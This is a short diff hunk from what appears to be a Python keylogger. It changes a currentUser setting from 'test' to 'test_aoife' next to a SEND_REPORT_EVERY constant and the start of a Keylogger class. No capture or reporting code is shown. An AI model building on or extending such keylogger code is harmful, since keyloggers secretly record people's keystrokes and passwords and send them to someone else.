@@ -6,7 +6,7 @@ import os
 
 SEND_REPORT_EVERY = 1
 
-currentUser = 'test'
+currentUser = 'test_aoife'
 
 class Keylogger:
     current_letter=''
